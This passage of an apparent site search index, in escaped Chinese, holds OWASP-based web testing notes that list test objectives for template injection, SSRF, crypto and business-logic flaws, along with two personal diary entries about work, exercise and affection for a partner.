\u7ed5\u8fc7\u4f9d\u8d56\u6807\u5934\u7684\u5b89\u5168\u63a7\u5236\u3002</p> <p>4.7.18\u670d\u52a1\u7aef\u6a21\u677f\u6ce8\u5165\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u68c0\u6d4b\u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e\u70b9\u3002 \u8bc6\u522b\u6a21\u677f\u5f15\u64ce\u3002 \u6784\u5efa\u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f\u3002</p> <p>4.7.19\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b SSRF \u6ce8\u5165\u70b9\u3002 \u6d4b\u8bd5\u6ce8\u5165\u70b9\u662f\u5426\u53ef\u5229\u7528\u3002 \u8bc4\u4f30\u6f0f\u6d1e\u7684\u4e25\u91cd\u6027\u3002</p> <p>4.7.20\u6279\u91cf\u5206\u914d\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b\u4fee\u6539\u5bf9\u8c61\u7684\u8bf7\u6c42 \u8bc4\u4f30\u662f\u5426\u53ef\u4ee5\u4fee\u6539\u4ece\u672a\u6253\u7b97\u4ece\u5916\u90e8\u4fee\u6539\u7684\u5b57\u6bb5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/8%E3%80%81%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E6%B5%8B%E8%AF%95/","title":"8\u3001\u9519\u8bef\u5904\u7406\u6d4b\u8bd5","text":"<p>\u9519\u8bef\u5904\u7406\u4e0d\u5f53\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b\u73b0\u6709\u7684\u9519\u8bef\u8f93\u51fa\u3002 \u5206\u6790\u8fd4\u56de\u7684\u4e0d\u540c\u8f93\u51fa\u3002</p> <p>4.8.2\u5806\u6808\u8ddf\u8e2a\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/9%E3%80%81%E5%BC%B1%E5%AF%86%E7%A0%81%E6%B5%8B%E8%AF%95/","title":"9\u3001\u5f31\u5bc6\u7801\u6d4b\u8bd5","text":"<p>\u5f31\u4f20\u8f93\u5c42\u5b89\u5168\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u9a8c\u8bc1\u670d\u52a1\u914d\u7f6e\u3002 \u68c0\u67e5\u6570\u5b57\u8bc1\u4e66\u7684\u52a0\u5bc6\u5f3a\u5ea6\u548c\u6709\u6548\u6027\u3002 \u786e\u4fdd TLS \u5b89\u5168\u6027\u4e0d\u53ef\u7ed5\u8fc7\u5e76\u4e14\u5728\u6574\u4e2a\u5e94\u7528\u7a0b\u5e8f\u4e2d\u6b63\u786e\u5b9e\u65bd</p> <p>4.9.2\u00a0Padding Oracle\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b\u4f9d\u8d56\u4e8e\u586b\u5145\u7684\u52a0\u5bc6\u6d88\u606f\u3002 \u5c1d\u8bd5\u7834\u574f\u52a0\u5bc6\u6d88\u606f\u7684\u586b\u5145\u5e76\u5206\u6790\u8fd4\u56de\u7684\u9519\u8bef\u6d88\u606f\u4ee5\u8fdb\u884c\u8fdb\u4e00\u6b65\u5206\u6790\u3002</p> <p>4.9.3\u6d4b\u8bd5\u901a\u8fc7\u672a\u52a0\u5bc6\u901a\u9053\u53d1\u9001\u7684\u654f\u611f\u4fe1\u606f</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b\u901a\u8fc7\u5404\u79cd\u6e20\u9053\u4f20\u8f93\u7684\u654f\u611f\u4fe1\u606f\u3002 \u8bc4\u4f30\u6240\u4f7f\u7528\u6e20\u9053\u7684\u9690\u79c1\u548c\u5b89\u5168\u6027</p> <p>4.9.4\u5f31\u52a0\u5bc6\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u63d0\u4f9b\u8bc6\u522b\u5f31\u52a0\u5bc6\u6216\u6563\u5217\u4f7f\u7528\u548c\u5b9e\u73b0\u7684\u6307\u5357\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E8%AE%B0%E5%BD%95230821/","title":"\u8bb0\u5f55230821","text":"<p>\u4eca\u5929\u4e5f\u6ca1\u6709\u548c\u522b\u4eba\u804a\u5929\u54df\uff01\u7a81\u53d1\u5947\u60f3\uff0c\u6211\u5c31\u628a\u6bdb\u6bdb\u7684\u804a\u5929\u6846\u5f53\u6210\u4e00\u4e2a\u5c0f\u6811\u6d1e\u5427\uff0c\u8bf4\u4e00\u4e9b\u60f3\u5bf9\u4f60\u8bf4\u7684\u8bdd\u3001\u4eca\u5929\u505a\u7684\u4e9b\u4e8b\u60c5\u3001\u5fc3\u60c5\u611f\u60f3\u3001everything\u00b7\u00b7\u00b7\u00b7 \u5947\u602a\u561e \u767d\u5929\u4f1a\u60f3\u5230\u6bdb\u6bdb\u597d\u591a\u6b21 \u8fd8\u62ff\u51fa\u7f8e\u7167\u770b\u4e86\u770b \u5c3d\u7ba1\u6ca1\u6709\u505a\u4ec0\u4e48\u4e8b\u60c5 \u65e9\u4e5d\u665a\u4e5d\u8fd8\u662f\u8ba9\u6211\u611f\u89c9\u4e9b\u8bb8\u75b2\u60eb\uff0c\u6253\u6e38\u620f\u5c31\u6709\u7528\u4e0d\u5b8c\u7684\u7cbe\u795e\u3002\u5750\u5728\u6905\u5b50\u4e0a\u5f88\u4e45\u4e5f\u4e0d\u7d2f\uff0c\u56e0\u4e3a\u90a3\u662f\u900f\u652f\u7cbe\u529b\u5427\u3002\u672c\u6765\u4eca\u5929\u4e2d\u5348\u4e0d\u60f3\u7761\u89c9\u7684\uff0c\u89c9\u5f97\u81ea\u5df1\u8fd8\u633a\u7cbe\u795e\u3002\u4ece\u4eac\u4e1c\u8bfb\u4e66\u4e0a\u627e\u4e86\u672c\u300a\u9ea6\u7530\u91cc\u7684\u5b88\u671b\u8005\u300b\u4e00\u9875\u6ca1\u770b\u5b8c\u5462\uff0c\u773c\u775b\u5df2\u7ecf\u7741\u4e0d\u5f00\u4e86\u3002 \u597d\u5bb6\u4f19\uff0c\u505a\u8fd9\u79cd\u4e8b\u60c5\u771f\u7684\u53ef\u4ee5\u8ba9\u4f60\u5f97\u77e5\u8eab\u4f53\u7684\u771f\u5b9e\u72b6\u6001\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u957f\u65f6\u95f4\u7684\u8111\u529b\u52b3\u52a8\u4e0d\u591f\u5bfc\u81f4\u7684\u3002\u6bdb\u6bdb\u7684\u72b6\u6001\u80af\u5b9a\u8981\u5f3a\u7684\u591a\u5427\u3002 \u6628\u5929\u7761\u4e86\u4e2a\u9971\u89c9\uff0c\u4ece23\u70b910\u52307\u70b930\u5206\u3002\u65e9\u7761\u7b2c\u4e8c\u5929\u7684\u611f\u89c9\u771f\u7684\u597d\uff0c\u8fd8\u4f1a\u53d8\u7684\u4e0d\u90a3\u4e48\u4e11\uff0c\u6015\u6bdb\u6bdb\u5acc\u5f03 \u8981\u65e9\u7761\u4e86\u3002</p> <p>\u5c31\u5148\u5199\u8fd9\u4e00\u70b9\u70b9\u5427\uff01\u6765\u65e5\u65b9\u957f\u3002</p> <p>\u89c2\u5bdf\u81ea\u5df1 \u6781\u5176\u5bb9\u6613\u53d7\u5230\u5916\u90e8\u73af\u5883\u5f71\u54cd\uff0c\u5bf9\u5468\u906d\u73af\u5883\u53d8\u5316\u654f\u611f\u3002 \u5177\u4f53\u4f53\u73b0\u5728\uff1a 1\u3001\u5c0f\u4fbf\u8131\u4e0b\u88e4\u5b50\u521a\u8981\u89e3\u51b3\u65f6\uff0c\u65c1\u8fb9\u4f4d\u7f6e\u4e00\u6765\u4eba\u5c31\u51fa\u4e0d\u6765\u4e86\u3002\u5fc3\u91cc\u7d27\u5f20 \u9632\u5907\u5fc3\u4e00\u4e0b\u5b50\u8d77\u6765\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u8d8a\u60f3\u5c31\u8d8a\u915d\u917f\u4e0d\u51fa\u6765\u3002\u53ea\u80fd\u5c34\u5c2c\u7684\u6775\u5728\u539f\u5730\uff0c\u8d70\u4e5f\u4e0d\u662f\u4e0d\u8d70\u4e5f\u4e0d\u662f\u3002 2\u3001\u5e26\u4e86\u8033\u673a\u5728\u98df\u5802\u3001\u7535\u68af\u7b49\u516c\u5171\u573a\u5408\u4f1a\u66f4\u81ea\u5728\u3002</p> <p>\u601d\u8003\u4e00\u4e0b\u4eca\u5929\u505a\u4e86\u4ec0\u4e48\u4e1c\u897ffor me\u3002 1\u3001\u66f4\u65b0WEB\u6d4b\u8bd5\u6846\u67b6\u81f3\u7b2c\u4e09\u7ae0 2\u3001\u4fef\u5367\u649140\u4e2a \u4ef0\u5367\u8d77\u575040\u4e2a(\u5199\u5b8c\u5c31\u53bb\u505a\u563f\u563f)</p> <p>\u4eca\u65e5\u5fc3\u5f97 \u6709\u4e86\u6846\u67b6\u540e\uff0c\u53ef\u4ee5\u660e\u786e\u5f97\u77e5\u81ea\u5df1\u54ea\u4e9b\u5730\u65b9\u4e0d\u4f1a\uff0c\u54ea\u4e9b\u8fd8\u6ca1\u638c\u63e1\u5b8c\u5168\u3002 CheetSheet\u4e5f\u53ef\u4ee5\u8d77\u5230\u7c7b\u4f3c\u7684\u4f5c\u7528\uff0c\u5c06\u8981\u505a\u7684\u4e8b\u60c5\uff0c\u5177\u4f53\u5206\u6210\u5f88\u591a\u5c0f\u9879\uff0c\u5b8c\u6210\u60c5\u51b5\u3001\u8be5\u505a\u4ec0\u4e48\u4e8b\u60c5\u6e05\u6670\u660e\u4e86\u3002</p> <p>\u5f53\u524d\u7684\u4e00\u4e9b\u5c0f\u60f3\u6cd5&amp;\u76ee\u6807 WEB\u5b89\u5168\u6d4b\u8bd5\u6846\u67b6\u6574\u7406\u7ef4\u62a4 HacktheBox Academy \u6587\u7ae0\u5b66\u4e60 HacktheBox \u9776\u673a\u5b66\u4e60\u5e76\u4ea7\u51fa\u6587\u7ae0\uff0c\u4e0d\u8981\u4e3a\u4e86\u83b7\u53d6\u77e5\u8bc6\u800c\u53bb\u5b66\u4e60\u77e5\u8bc6\uff0c\u6700\u91cd\u8981\u7684\u662f\u5b66\u4f1a\u5982\u4f55\u5feb\u901f\u53d1\u73b0\u5e76\u5229\u7528\u77e5\u8bc6\u53bb\u89e3\u51b3\u76ee\u524d\u9047\u5230\u7684\u95ee\u9898\u3002 GO\u8bed\u8a00\u5b66\u4e60\uff0c\u7f16\u5199\u5c0f\u5de5\u5177\uff0c\u6709\u4e86\u60f3\u5b9e\u73b0\u7684\u9700\u6c42\u57cb\u4e0b\u5934\u53bb\u5b66\u4e60\u5c31\u80fd\u5b66\u4f1a\u3002 \u4e61\u9547\u5c0f\u5e97\u8ba1\u5212\uff1a\u4e3b\u673a\u6e38\u620f \u56fe\u4e66\u89d2 \u684c\u6e38 \u68cb\u724c\u5ba4 \u79c1\u4eba\u5f71\u9662 \u996e\u54c1 \u5c0f\u98df\uff1b\u6210\u672c \u88c5\u4fee \u521b\u610f\uff08\u7f8e\u89c2 \u8282\u7ea6\u6210\u672c\uff09\u4ee5\u53ca\u5177\u4f53\u5b9e\u73b0\u65b9\u5f0f\uff1b\u4ee5\u4e0a\u6301\u7eed\u5173\u6ce8\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E8%AE%B0%E5%BD%95230822/","title":"\u8bb0\u5f55230822","text":"<p>23/08/22 23:30 \u5468\u4e8c\uff0c\u7b2c\u4e8c\u5929\uff0c\u597d\u6162\u3002\u6628\u5929\u665a\u4e0a\u7761\u524d\u60f3\u7ed9\u4f60\u6253\u7535\u8bdd\u804a\u5929\u8036\uff0c\u5927\u6982\u8eba\u4e8630\u5206\u949f\u4e0d\u5230\u5c31\u7761\u7740\u4e86\u3002\u660e\u5929\u662f\u5b89\u5168\u4fdd\u969c\u7684\u6700\u540e\u4e00\u5929\uff0c\u6574\u7406\u4e0b\u603b\u7ed3\u62a5\u544a\u548c\u5269\u4f59\u5de5\u4f5c\u5c31\u53ef\u4ee5\u64a4\u9000\u54af\u3002\u59dc\u603b\u96be\u5f97\u6709\u65f6\u95f4\u4e00\u8d77\u5403\u4e2a\u996d\uff0c\u4e0d\u77e5\u9053\u4f1a\u6709\u4ec0\u4e48\u6536\u83b7\uff0c\u6211\u5df2\u7ecf\u51c6\u5907\u597d\u4e86\u54e6\u3002\u4e0b\u534818\u70b9\u949f\u603b\u60f3\u8eba\u4e0b\u4f11\u606f\u4f1a\uff0c\u53ef\u662f\u9886\u5bfc\u523020\u70b9\u5de6\u53f3\u624d\u4f1a\u8d70\uff0c\u597d\u70e6\u54e6\u3002\u4e0d\u8fc7\u5979\u80fd\u529b\u633a\u5f3a\u7684\uff0c\u5bf9\u5916\u6001\u5ea6\u5f3a\u786c\uff0c\u4e8b\u60c5\u89e3\u51b3\u5f88\u6709\u6761\u7406\u6709\u81ea\u5df1\u7684\u4e00\u5957\u65b9\u6cd5\u3002\u51fa\u53bb\u8d70\u4e00\u4f1a\u6d88\u5316\u6d88\u5316\u90fd\u4e0d\u6562\u54c8\u54c8\uff08\u660e\u5929\u51fa\u5403\u5b8c\u996d\u56de\u5de5\u4f4d\u665a\u4e00\u70b9\uff09\uff0c\u76f4\u63a5\u5750\u4e0b\u4f1a\u5f88\u96be\u53d7\u3002\u6628\u5929\u7684\u8fd0\u52a8\u6ca1\u6709\u505a\u5b8c\uff0c\u4eca\u5929\u5c3d\u529b\u5427\uff0c\u4ece\u7ec6\u72d7\u53d8\u6210\u4e0d\u662f\u7ec6\u72d7\u3002\u8fd9\u6837\u53ef\u4ee5\u628a\u81ea\u5df1\u66f4\u597d\u7684\u72b6\u6001\u5c55\u73b0\u7ed9\u4f60\uff0c\u6bcf\u5929\u8fd9\u6837\u5b50\u5199\u4e0d\u77e5\u9053\u4f1a\u4e0d\u4f1a\u592a\u957f\uff0c\u6574\u7406\u5230\u4e00\u4e2a\u53ef\u89c6\u5316\u66f4\u5f3a\u7684\u5730\u65b9\u4f1a\u66f4\u597d\u4e9b\u5427\u3002\u4e0d\u8981\u5acc\u6211\u70e6\u54e6\uff0c23:54\u4e86\u6211\u8981\u7761\u89c9\u5566\uff0c\u665a\u5b89\uff01\u6bdb\u6bdb\u3002</p> <p>\u53d1\u73b0\u5de5\u4f5c\u540e\u7684\u786e\u7f3a\u4e86\u70b9\u4e1c\u897f\uff0c\u76f8\u6bd4\u5728\u5b66\u6821\u7684\u65f6\u5019\u3002\u56e0\u4e3a\u662f\u6280\u6821\uff0c\u603b\u89c9\u5f97\u548c\u9ad8\u4e2d\u751f\u4eec\u6709\u4e9b\u5dee\u8ddd\u3002\u5982\u679c\u518d\u4e0d\u52aa\u529b\u4e00\u70b9\u600e\u4e48\u884c\u5462\uff1f\u6211\u8981\u77e5\u803b\u800c\u540e\u52c7\u3002\u7279\u522b\u662f\u5728\u7b2c\u4e09\u5e74\u90a3\u79cd\u5b66\u4e60\u6c1b\u56f4\u6d53\u70c8\u7684\u7279\u8bad\u73ed\uff0c\u6bcf\u5929\u90fd\u4f1a\u63d0\u9192\u4f60\u5b66\u4e60\u3001\u5b66\u4e60\u3001\u5b66\u4e60\u3002\u95f2\u6687\u4e4b\u4f59\u80fd\u53bb\u8fd0\u52a8\u4e00\u4e0b\u8dd1\u8dd1\u6b65\uff0c\u66f4\u589e\u5f3a\u4e86\u70b9\u81ea\u5f8b\u6027\u3002\u4e0d\u4f1a\u53bb\u6253\u6e38\u620f\uff0c\u4e5f\u4e0d\u4f1a\u53bb\u60f3\u5b66\u4e60\u4e4b\u5916\u7684\u4e8b\uff0c\u5c31\u662f\u4f1a\u60f3\u5973\u751f\u54c8\u54c8\u3002\u574f\u5904\u5c31\u662f\u89c6\u91ce\u88ab\u5c40\u9650\u4e86\uff0c\u4e3a\u4e86\u5b66\u4e60\u800c\u5b66\u4e60\uff0c\u6280\u672f\u4e0d\u53bb\u5e94\u7528\uff0c\u6216\u8005\u6709\u7684\u7528\u4e0d\u5230\u3002\u601d\u7ef4\u5f88\u5c11\u53d1\u6563\u81f3\u4e16\u754c\u7684\u5176\u4ed6\u5730\u65b9\uff0c\u4e0d\u77e5\u9053\u751f\u6d3b\u65b9\u5f0f\u6709\u592a\u591a\u79cd\u4e86\uff0c\u6709\u8da3\u7684\u4e8b\u7269\u3001\u6280\u80fd\u4e5f\u6570\u4e0d\u80dc\u6570\u3002 \u5de5\u4f5c\u540e\u7684\u72b6\u6001\u6709\u70b9\u61d2\u6563\uff0c\u6ca1\u6709\u8ba4\u771f\u53bb\u60f3\u6211\u80fd\u4ece\u4e2d\u5b66\u5230\u4ec0\u4e48\uff0c\u6211\u8fd8\u80fd\u6709\u54ea\u4e9b\u63d0\u5347\u3002\u968f\u7740\u540c\u4e00\u4efd\u5de5\u4f5c\u65f6\u95f4\u968f\u4e4b\u589e\u957f\uff0c\u4f1a\u53d1\u73b0\u81ea\u5df1\u505a\u7684\u4e8b\u60c5\u597d\u50cf\u6ca1\u6709\u4ec0\u4e48\u610f\u601d\uff0c\u5f88\u6742\u5f88\u4e71\u3002\u5bf9\u81ea\u5df1\u6ca1\u5565\u5e2e\u52a9\uff0c\u5176\u5b9e\u662f\u81ea\u5df1\u9020\u6210\u7684\u8fd9\u79cd\u540e\u679c\uff0c\u5bfc\u81f4\u81ea\u5df1\u9677\u5165\u5185\u8017\u3002\u5e0c\u671b\u8bb0\u5f55\u4e0b\u6765\u80fd\u5370\u5728\u8111\u5b50\u91cc\u5e76\u6539\u6b63\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/10%E3%80%81%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%B5%8B%E8%AF%95/","title":"10\u3001\u4e1a\u52a1\u903b\u8f91\u6d4b\u8bd5","text":"<p>\u4e1a\u52a1\u903b\u8f91\u4ecb\u7ecd</p> <p>\u6d4b\u8bd5\u591a\u529f\u80fd\u52a8\u6001 Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u4e1a\u52a1\u903b\u8f91\u7f3a\u9677\u9700\u8981\u91c7\u7528\u975e\u5e38\u89c4\u65b9\u6cd5\u8fdb\u884c\u601d\u8003\u3002\u5982\u679c\u5f00\u53d1\u5e94\u7528\u7a0b\u5e8f\u7684\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\u7684\u76ee\u7684\u662f\u6309\u7279\u5b9a\u987a\u5e8f\u6267\u884c\u6b65\u9aa4 1\u30012\u30013 \u6765\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u5982\u679c\u7528\u6237\u4ece\u6b65\u9aa4 1 \u76f4\u63a5\u8fdb\u5165\u6b65\u9aa4 3 \u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f\u5728\u8fd9\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\u4e2d\uff0c\u5e94\u7528\u7a0b\u5e8f\u662f\u5426\u901a\u8fc7\u6253\u5f00\u5931\u8d25\u6765\u63d0\u4f9b\u8bbf\u95ee\uff1f\u62d2\u7edd\u8bbf\u95ee\uff0c\u6216\u8005\u53ea\u662f\u51fa\u9519\u5e76\u663e\u793a 500 \u6d88\u606f\uff1f</p> <p>\u53ef\u4ee5\u4e3e\u51fa\u5f88\u591a\u4f8b\u5b50\uff0c\u4f46\u4e00\u4e2a\u4e0d\u53d8\u7684\u6559\u8bad\u662f\u201c\u8df3\u51fa\u4f20\u7edf\u667a\u6167\u601d\u8003\u201d\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u6f0f\u6d1e\u65e0\u6cd5\u88ab\u6f0f\u6d1e\u626b\u63cf\u5668\u68c0\u6d4b\u5230\uff0c\u5e76\u4e14\u4f9d\u8d56\u4e8e\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u7684\u6280\u80fd\u548c\u521b\u9020\u529b\u3002\u6b64\u5916\uff0c\u8fd9\u79cd\u7c7b\u578b\u7684\u6f0f\u6d1e\u901a\u5e38\u662f\u6700\u96be\u68c0\u6d4b\u7684\u6f0f\u6d1e\u4e4b\u4e00\uff0c\u5e76\u4e14\u901a\u5e38\u662f\u7279\u5b9a\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7684\uff0c\u4f46\u540c\u65f6\uff0c\u5982\u679c\u88ab\u5229\u7528\uff0c\u901a\u5e38\u4e5f\u662f\u5bf9\u5e94\u7528\u7a0b\u5e8f\u6700\u6709\u5bb3\u7684\u6f0f\u6d1e\u4e4b\u4e00\u3002</p> <p>\u4e1a\u52a1\u903b\u8f91\u7f3a\u9677\u7684\u5206\u7c7b\u5c1a\u672a\u5f97\u5230\u5145\u5206\u7814\u7a76\uff1b\u5c3d\u7ba1\u5229\u7528\u4e1a\u52a1\u7f3a\u9677\u7ecf\u5e38\u53d1\u751f\u5728\u73b0\u5b9e\u4e16\u754c\u7684\u7cfb\u7edf\u4e2d\uff0c\u5e76\u4e14\u8bb8\u591a\u5e94\u7528\u6f0f\u6d1e\u7814\u7a76\u4eba\u5458\u5bf9\u6b64\u8fdb\u884c\u4e86\u8c03\u67e5\u3002\u6700\u53d7\u5173\u6ce8\u7684\u662f Web \u5e94\u7528\u7a0b\u5e8f\u3002\u793e\u533a\u5185\u90e8\u5b58\u5728\u4e89\u8bba\uff0c\u8fd9\u4e9b\u95ee\u9898\u662f\u5426\u4ee3\u8868\u4e86\u7279\u522b\u65b0\u7684\u6982\u5ff5\uff0c\u6216\u8005\u5b83\u4eec\u662f\u5426\u662f\u4f17\u6240\u5468\u77e5\u7684\u539f\u5219\u7684\u53d8\u4f53\u3002</p> <p>\u4e1a\u52a1\u903b\u8f91\u7f3a\u9677\u7684\u6d4b\u8bd5\u7c7b\u4f3c\u4e8e\u529f\u80fd\u6d4b\u8bd5\u4eba\u5458\u4f7f\u7528\u7684\u6d4b\u8bd5\u7c7b\u578b\uff0c\u91cd\u70b9\u5173\u6ce8\u903b\u8f91\u6216\u6709\u9650\u72b6\u6001\u6d4b\u8bd5\u3002\u8fd9\u4e9b\u7c7b\u578b\u7684\u6d4b\u8bd5\u8981\u6c42\u5b89\u5168\u4e13\u4e1a\u4eba\u5458\u4ee5\u4e0d\u540c\u7684\u65b9\u5f0f\u601d\u8003\uff0c\u5f00\u53d1\u6ee5\u7528\u548c\u8bef\u7528\u6848\u4f8b\uff0c\u5e76\u4f7f\u7528\u529f\u80fd\u6d4b\u8bd5\u4eba\u5458\u6240\u91c7\u7528\u7684\u8bb8\u591a\u6d4b\u8bd5\u6280\u672f\u3002\u4e1a\u52a1\u903b\u8f91\u6ee5\u7528\u6848\u4f8b\u7684\u81ea\u52a8\u5316\u662f\u4e0d\u53ef\u80fd\u7684\uff0c\u5e76\u4e14\u4ecd\u7136\u662f\u4f9d\u8d56\u4e8e\u6d4b\u8bd5\u4eba\u5458\u7684\u6280\u80fd\u53ca\u5176\u5bf9\u5b8c\u6574\u4e1a\u52a1\u6d41\u7a0b\u53ca\u5176\u89c4\u5219\u7684\u4e86\u89e3\u7684\u624b\u52a8\u827a\u672f\u3002</p> <p>4.10.1\u6d4b\u8bd5\u4e1a\u52a1\u903b\u8f91\u6570\u636e\u9a8c\u8bc1</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b\u6570\u636e\u6ce8\u5165\u70b9\u3002 \u9a8c\u8bc1\u6240\u6709\u68c0\u67e5\u90fd\u5728\u540e\u7aef\u8fdb\u884c\u4e14\u65e0\u6cd5\u7ed5\u8fc7\u3002 \u5c1d\u8bd5\u6253\u7834\u9884\u671f\u6570\u636e\u7684\u683c\u5f0f\u5e76\u5206\u6790\u5e94\u7528\u7a0b\u5e8f\u5982\u4f55\u5904\u7406\u5b83\u3002</p> <p>4.10.2\u6d4b\u8bd5\u4f2a\u9020\u8bf7\u6c42\u80fd\u529b</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u67e5\u770b\u9879\u76ee\u6587\u6863\uff0c\u5bfb\u627e\u53ef\u731c\u6d4b\u3001\u53ef\u9884\u6d4b\u6216\u9690\u85cf\u7684\u5b57\u6bb5\u529f\u80fd\u3002 \u63d2\u5165\u903b\u8f91\u4e0a\u6709\u6548\u7684\u6570\u636e\u4ee5\u7ed5\u8fc7\u6b63\u5e38\u7684\u4e1a\u52a1\u903b\u8f91\u5de5\u4f5c\u6d41\u7a0b\u3002</p> <p>4.10.3\u6d4b\u8bd5\u5b8c\u6574\u6027\u68c0\u67e5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u67e5\u770b\u7528\u4e8e\u79fb\u52a8\u3001\u5b58\u50a8\u6216\u5904\u7406\u6570\u636e\u7684\u7cfb\u7edf\u7ec4\u4ef6\u7684\u9879\u76ee\u6587\u6863\u3002 \u786e\u5b9a\u7ec4\u4ef6\u5728\u903b\u8f91\u4e0a\u53ef\u4ee5\u63a5\u53d7\u4ec0\u4e48\u7c7b\u578b\u7684\u6570\u636e\u4ee5\u53ca\u7cfb\u7edf\u5e94\u8be5\u9632\u8303\u4ec0\u4e48\u7c7b\u578b\u7684\u6570\u636e\u3002 \u786e\u5b9a\u8c01\u5e94\u8be5\u88ab\u5141\u8bb8\u4fee\u6539\u6216\u8bfb\u53d6\u6bcf\u4e2a\u7ec4\u4ef6\u4e2d\u7684\u6570\u636e\u3002 \u5c1d\u8bd5\u63d2\u5165\u3001\u66f4\u65b0\u6216\u5220\u9664\u6bcf\u4e2a\u7ec4\u4ef6\u4f7f\u7528\u7684\u6570\u636e\u503c\uff0c\u800c\u8fd9\u4e9b\u6570\u636e\u503c\u5728\u4e1a\u52a1\u903b\u8f91\u5de5\u4f5c\u6d41\u7a0b\u4e2d\u662f\u4e0d\u5141\u8bb8\u7684\u3002</p> <p>4.10.4\u8fdb\u7a0b\u65f6\u5e8f\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u67e5\u770b\u9879\u76ee\u6587\u6863\u4ee5\u4e86\u89e3\u53ef\u80fd\u53d7\u65f6\u95f4\u5f71\u54cd\u7684\u7cfb\u7edf\u529f\u80fd\u3002 \u5f00\u53d1\u5e76\u6267\u884c\u8bef\u7528\u6848\u4f8b\u3002</p> <p>4.10.5\u6d4b\u8bd5\u51fd\u6570\u53ef\u4f7f\u7528\u6b21\u6570\u9650\u5236</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u786e\u5b9a\u5fc5\u987b\u5bf9\u5176\u8c03\u7528\u6b21\u6570\u8bbe\u7f6e\u9650\u5236\u7684\u51fd\u6570\u3002 \u8bc4\u4f30\u529f\u80fd\u662f\u5426\u8bbe\u7f6e\u4e86\u903b\u8f91\u9650\u5236\u4ee5\u53ca\u662f\u5426\u7ecf\u8fc7\u6b63\u786e\u9a8c\u8bc1\u3002</p> <p>4.10.6\u5de5\u4f5c\u6d41\u7a0b\u89c4\u907f\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u67e5\u770b\u9879\u76ee\u6587\u6863\uff0c\u4e86\u89e3\u4ee5\u4e0e\u9884\u671f\u4e1a\u52a1\u903b\u8f91\u6d41\u4e0d\u540c\u7684\u987a\u5e8f\u8df3\u8fc7\u6216\u6267\u884c\u5e94\u7528\u7a0b\u5e8f\u6d41\u7a0b\u4e2d\u7684\u6b65\u9aa4\u7684\u65b9\u6cd5\u3002 \u5f00\u53d1\u4e00\u4e2a\u8bef\u7528\u6848\u4f8b\u5e76\u5c1d\u8bd5\u89c4\u907f\u5df2\u8bc6\u522b\u7684\u6bcf\u4e2a\u903b\u8f91\u6d41\u7a0b\u3002</p> <p>4.10.7\u6d4b\u8bd5\u9488\u5bf9\u5e94\u7528\u7a0b\u5e8f\u6ee5\u7528\u7684\u9632\u5fa1\u63aa\u65bd</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u4ece\u9488\u5bf9\u7cfb\u7edf\u8fdb\u884c\u7684\u6240\u6709\u6d4b\u8bd5\u4e2d\u751f\u6210\u6ce8\u91ca\u3002 \u6839\u636e\u79ef\u6781\u7684\u8f93\u5165\uff0c\u68c0\u67e5\u54ea\u4e9b\u6d4b\u8bd5\u5177\u6709\u4e0d\u540c\u7684\u529f\u80fd\u3002 \u4e86\u89e3\u73b0\u6709\u7684\u9632\u5fa1\u63aa\u65bd\u5e76\u9a8c\u8bc1\u5b83\u4eec\u662f\u5426\u8db3\u4ee5\u4fdd\u62a4\u7cfb\u7edf\u514d\u53d7\u7ed5\u8fc7\u6280\u672f\u7684\u653b\u51fb\u3002</p> <p>4.10.8\u5f02\u5e38\u6587\u4ef6\u7c7b\u578b\u6d4b\u8bd5\u4e0a\u4f20</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u67e5\u770b\u9879\u76ee\u6587\u6863\u4ee5\u4e86\u89e3\u7cfb\u7edf\u62d2\u7edd\u7684\u6587\u4ef6\u7c7b\u578b\u3002 \u9a8c\u8bc1\u662f\u5426\u62d2\u7edd\u5e76\u5b89\u5168\u5904\u7406\u4e0d\u53d7\u6b22\u8fce\u7684\u6587\u4ef6\u7c7b\u578b\u3002 \u9a8c\u8bc1\u6587\u4ef6\u6279\u91cf\u4e0a\u4f20\u662f\u5426\u5b89\u5168\uff0c\u5e76\u4e14\u4e0d\u5141\u8bb8\u4efb\u4f55\u7ed5\u8fc7\u8bbe\u7f6e\u7684\u5b89\u5168\u63aa\u65bd\u3002</p> 